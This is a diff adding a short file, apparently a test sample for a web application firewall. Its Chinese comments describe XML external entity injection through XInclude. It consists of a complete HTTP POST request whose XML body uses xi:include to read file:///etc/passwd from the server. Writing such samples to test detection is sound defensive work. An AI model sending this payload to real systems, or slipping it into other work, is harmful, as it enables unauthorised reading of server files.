@@ -1,0 +1,14 @@
+# XML外部实体注入_文件读取_XInclude
+# XInclude（XML Inclusions or XML Inclusions) 是一种 XML 标准，允许在一个 XML 文档中包含其他 XML 文档的内容。这种机制可以帮助简化和模块化 XML 文档，使得可以在一个文档中引用其他文档的片段，而不必在每个文档中重复相同的内容。通过在 XML 文档中引用外部实体，攻击者可以尝试读取本地文件或执行其他恶意操作。
+POST /?bid=hd_tag_m8mv24v1 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24v1
+RM-PRO-Token: ca4698f73accc194bc1851919c2d3724
+RM-PRO-Time: 1742808415547
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<?xml version="1.0" ?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+ <xi:include href="file:///etc/passwd" parse="text"/>
+</root>
